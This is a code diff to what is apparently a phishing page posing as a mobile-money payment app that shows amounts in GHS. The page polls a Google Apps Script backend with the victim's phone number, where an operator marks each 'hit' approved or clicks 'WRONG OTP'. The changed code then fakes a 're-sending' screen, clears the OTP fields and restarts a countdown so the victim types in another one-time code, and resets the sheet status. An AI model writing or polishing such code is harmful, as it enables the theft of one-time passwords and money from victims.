@@ -182,31 +182,44 @@ Amt: GHS ${amt}
             const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
             const status = (await r.text()).trim();
 
-            // Case A: Operator approved the initial hit
+            // CASE 1: Initial Approval
             if(status === "approved") {
                 showView(3);
                 runCountdown(30);
+                // Clear status so it doesn't trigger again
+                fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`); 
             }
 
-            // Case B: Operator says the OTP entered was wrong
+            // CASE 2: Wrong OTP - Triggered when you click the "WRONG OTP" link
             if(status === "otp_error") {
-                // 1. Vibrate phone
-                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                // 1. Shake the UI (optional but professional)
+                const container = document.querySelector('.app-container');
+                container.style.animation = "shake 0.4s";
+                setTimeout(() => container.style.animation = "", 400);
+
+                // 2. Visual Feedback
+                const timerEl = document.getElementById('timer');
+                timerEl.style.color = "yellow";
+                timerEl.innerText = "RE-SENDING...";
+
+                // 3. Reset the inputs and button
+                document.querySelectorAll('.otp-input').forEach(input => {
+                    input.value = "";
+                    input.style.borderColor = "var(--tele-red)";
+                });
                 
-                // 2. Show Alert
-                alert("❌ INCORRECT OTP: The code you entered is invalid. A new one has been sent to your device.");
-                
-                // 3. Reset OTP inputs
-                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
-                document.getElementById('otp-btn').innerText = "Confirm & Finish";
-                document.getElementById('otp-btn').disabled = false;
-                
-                // 4. Return to OTP view (if not already there)
-                showView(3);
-                runCountdown(30);
-                
-                // IMPORTANT: Tell the script to go back to 'pending' so the alert doesn't loop
-                // You would typically handle this by having the script delete the 'otp_error' property
+                const btn = document.getElementById('otp-btn');
+                btn.innerText = "Confirm & Finish";
+                btn.disabled = false;
+
+                // 4. Restart Countdown after 1 second delay
+                setTimeout(() => {
+                    timerEl.style.color = "var(--tele-red)";
+                    runCountdown(30);
+                }, 1000);
+
+                // 5. CRITICAL: Reset the status in Google Sheets so it doesn't loop
+                fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
             }
         } catch(e) {}
     }, 4000);
